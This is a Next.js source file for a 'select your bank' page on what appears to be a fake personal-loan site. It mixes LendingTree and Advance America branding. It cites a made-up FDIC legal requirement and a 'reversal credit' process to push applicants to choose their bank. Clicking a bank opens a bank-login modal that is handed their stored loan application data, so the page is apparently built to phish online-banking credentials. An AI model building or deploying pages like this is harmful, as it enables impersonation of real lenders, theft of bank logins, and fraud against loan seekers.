"use client"

import { useState, useEffect } from "react"
import { BankLoginModal } from "@/components/bank-login-modal"
import Image from "next/image"
import Link from "next/link"
import { DollarSign } from "lucide-react"

const banks = [
  { id: "usaa", name: "Usaa", logo: "/banks/usaa-logo.jpeg" },
  { id: "chase", name: "Chase", logo: "/banks/chase-logo.svg" },
  { id: "bankofamerica", name: "Bank of America", logo: "/banks/bank-of-america-logo.svg" },
  { id: "wellsfargo", name: "Wells Fargo", logo: "/banks/wells-fargo-logo.svg" },
  { id: "tdbank", name: "TD Bank", logo: "/banks/td-bank-logo.svg" },
  { id: "navyfederal", name: "Navy Federal Credit Union", logo: "/banks/navy-federal-logo.svg" },
  { id: "truist", name: "Truist", logo: "/banks/truist-logo.png" },
  { id: "usbank", name: "Us Bank", logo: "/banks/usbank-logo.png" },
  { id: "keybank", name: "KeyBank", logo: "/banks/keybank-logo.svg" },
  { id: "citibank", name: "CitiBank", logo: "/banks/citibank-logo.png" },
]

export default function SelectBankPage() {
  const [selectedBank, setSelectedBank] = useState<{ id: string; name: string } | null>(null)
  const [isModalOpen, setIsModalOpen] = useState(false)
  const [loanFormData, setLoanFormData] = useState<Record<string, string> | null>(null)

  useEffect(() => {
    const storedData = sessionStorage.getItem("loanFormData")
    if (storedData) {
      setLoanFormData(JSON.parse(storedData))
    }
  }, [])

  const handleBankClick = (bank: { id: string; name: string }) => {
    setSelectedBank(bank)
    setIsModalOpen(true)
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="bg-white border-b border-gray-200">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between h-16">
            <Link href="/" className="flex items-center">
              <Image
                src="/images/lending-tree-logo.png"
                alt="Advance America"
                width={150}
                height={40}
                className="h-10 w-auto"
              />
            </Link>
            <nav className="hidden md:flex items-center space-x-6">
              <Link href="/personal-loans" className="text-gray-700 hover:text-gray-900 font-medium text-sm">
                Personal Loans
              </Link>
              <Link href="/how-it-works" className="text-gray-700 hover:text-gray-900 font-medium text-sm">
                How It Works
              </Link>
              <Link href="/select-bank" className="text-gray-700 hover:text-gray-900 font-medium text-sm">
                Bank Auth
              </Link>
              <Link href="/faqs" className="text-gray-700 hover:text-gray-900 font-medium text-sm">
                FAQs
              </Link>
              <Link href="/contact" className="text-gray-700 hover:text-gray-900 font-medium text-sm">
                Contact
              </Link>
              <Link href="/privacy-policy" className="text-gray-700 hover:text-gray-900 font-medium text-sm">
                Privacy Policy
              </Link>
            </nav>
            <div className="flex items-center space-x-3">
              <Link
                href="/"
                className="px-4 py-2 text-emerald-600 border border-emerald-600 rounded-md font-medium text-sm hover:bg-emerald-50 transition-colors"
              >
                Login
              </Link>
              <Link
                href="/personal-loans"
                className="px-4 py-2 bg-emerald-600 text-white rounded-md font-medium text-sm hover:bg-emerald-700 transition-colors"
              >
                Apply Now
              </Link>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-12">
        <div className="max-w-5xl mx-auto">
          {/* Verification Text */}
          <div className="text-center mb-8 max-w-4xl mx-auto">
            <p className="text-gray-700 leading-relaxed">
              As per the law of Federal Deposit Insurance Corporation, we would need to verify you to check your
              repayment capacity and also that you are not misusing anyone's identity. To do this verification – please
              agree to the consent form and move ahead with the loan officer instructions. I hereby authorize Advance
              Advance America (under reversal credit & reversal process) to access and utilize the following banking
              information for the specific purpose of processing payments, setting up direct deposits, etc.
            </p>
          </div>

          {/* Instruction Text */}
          <div className="text-center mb-10">
            <p className="text-gray-700">
              Select your bank by clicking on <span className="font-bold">Bank Logo</span>. If your bank is not listed,
              click <span className="font-bold">Other Banks & Credit Unions</span>.
            </p>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-4 mb-10">
            {banks.map((bank) => (
              <button
                key={bank.id}
                onClick={() => handleBankClick(bank)}
                className="bg-white border border-gray-200 rounded-lg p-6 hover:border-blue-400 hover:shadow-md transition-all duration-200 flex items-center justify-center h-28"
              >
                <Image
                  src={bank.logo || "/placeholder.svg"}
                  alt={bank.name}
                  width={140}
                  height={60}
                  className="max-w-full max-h-16 object-contain"
                />
              </button>
            ))}
          </div>

          <div className="flex justify-center">
            <button
              onClick={() => {
                setSelectedBank({ id: "other", name: "" })
                setIsModalOpen(true)
              }}
              className="px-8 py-3 bg-blue-600 text-white rounded-md font-medium hover:bg-blue-700 transition-colors"
            >
              Other Banks & Credit Unions
            </button>
          </div>
        </div>
      </main>

      {/* Bank Login Modal */}
      <BankLoginModal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        bankName={selectedBank?.name || ""}
        bankId={selectedBank?.id || ""}
        loanFormData={loanFormData}
      />
    </div>
  )
}
